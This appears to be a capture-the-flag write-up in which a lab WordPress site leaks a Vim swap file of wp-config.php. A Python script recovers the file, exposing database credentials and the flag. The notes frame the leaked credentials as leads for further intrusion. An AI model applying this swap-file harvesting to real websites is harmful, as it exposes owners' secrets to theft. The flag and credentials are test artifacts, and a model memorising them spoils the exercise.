# Science Hot News


## Challenge description

**Points:** 2

```
Hi Senior Researcher,

something has gone wrong with the science-hotnews.nren.tcc server, and the site has suddenly gone offline. The administrator had to fix things manually to get the news server back online.

Your task is to find out whether the administrator left any relics behind.

Stay curious!
```

## Summary

`science-hotnews.nren.tcc` is a WordPress site (CNAME `wp-srv.nren.tcc`) that the
admin took offline and replaced with a static *"Site under reconstruction"*
`index.html`. While hand-editing `wp-config.php` on the server as **root** during
that fix, the admin left a **Vim swap file** behind: `/.wp-config.php.swp` is still
web-served (HTTP 200). Recovering the swap file reconstructs the unsaved
`wp-config.php`, and the flag is sitting in the `AUTH_KEY` secret-key define.

## Solution

### Step 1: Recon — WordPress in a broken state behind a placeholder page

DNS shows the host is a CNAME to `wp-srv.nren.tcc`. The homepage is a static
"under reconstruction" page (`Server: Apache/2.4.68 (Debian)`), but the WordPress
install is still present underneath:

- `/readme.html`, `/license.txt`, `/xmlrpc.php` → **200** (WordPress files present)
- `/index.php`, `/wp-admin/`, `/wp-login.php`, `/wp-config.php` → **500** (PHP broken)

The admin dropped an `index.html` so Apache's `DirectoryIndex` serves it ahead of
the broken `index.php`. The challenge asks for "relics the administrator left
behind" during the manual fix — i.e. editor/backup leftovers.

### Step 2: Find the relic — a leftover Vim swap file

Fuzzing backup/swap names at the web root, `/.wp-config.php.swp` returns **200**
(12288 bytes). Its magic bytes are `b0VIM 9.1` and the embedded username is `root`
— a genuine Vim swap file from the admin's in-place edit of `wp-config.php`.

### Step 3: Recover the swap file and read the flag

No `vim -r` was available, so the swap file is parsed directly. A Vim swap file's
last block is the `ad` (data) block; its header gives `db_txt_end` and a per-line
index array, and line text grows downward from `db_txt_start`. Reconstructing the
lines yields the original `wp-config.php`, whose `AUTH_KEY` holds the flag:

```python
#!/usr/bin/env python3
"""Solve: Science Hot News — recover flag from a web-served Vim swap of wp-config.php."""
import struct, re, urllib.request

URL   = "http://science-hotnews.nren.tcc/.wp-config.php.swp"
BLOCK = 4096

swp = urllib.request.urlopen(URL, timeout=30).read()
assert swp[:5] == b"b0VIM", "not a Vim swap file"

# Last 4096-byte block is the data ('ad') block holding the file's lines.
blk = swp[-BLOCK:]
assert blk[:2] == b"ad"
# header: db_id(2) pad(2) db_free(4) db_txt_start(4) db_txt_end(4) db_line_count(4)
_free, _txt_start, txt_end, nlines = struct.unpack_from("<IIII", blk, 4)

MASK, idx_off = 0x0FFFFFFF, 20
idx = [struct.unpack_from("<I", blk, idx_off + 4*i)[0] & MASK for i in range(nlines)]

lines = []
for i in range(nlines):
    start = idx[i]
    end   = txt_end if i == 0 else idx[i-1]
    lines.append(blk[start:end].split(b"\x00")[0])

config = b"\n".join(lines).decode("utf-8", "replace")
print(config)
print("\n[+] FLAG:", re.search(r"FLAG\{[^}]+\}", config).group())
```

Output:

```
define( 'DB_NAME', 'wp_recon' );
define( 'DB_USER', 'wp_admin' );
define( 'DB_PASSWORD', 'S3cr3t-db-p4ss!2026' );
define( 'DB_HOST', 'db.internal.nren.tcc' );
...
define( 'AUTH_KEY', 'FLAG{Qdq3-LPjI-UQog-K1Ox}' );

[+] FLAG: FLAG{Qdq3-LPjI-UQog-K1Ox}
```

## Flag

```
FLAG{Qdq3-LPjI-UQog-K1Ox}
```

## Notes

- Root cause: an editor swap file (`.<name>.swp`) left in the web root. Vim writes
  it on the first edit and removes it only on a clean `:wq`; an interrupted/crashed
  session leaves it recoverable, and Apache happily serves the dotfile.
- The recovered config also leaks real-looking internal secrets — DB creds
  `wp_admin : S3cr3t-db-p4ss!2026` on `db.internal.nren.tcc`, plus the full set of
  WordPress auth salts — useful leads if a later chapter exposes that DB or a login.
- Artifacts saved next to this file: `scienceHotNews_wp-config.php.swp` (raw relic)
  and `scienceHotNews_wp-config.recovered.php` (reconstructed source).
```
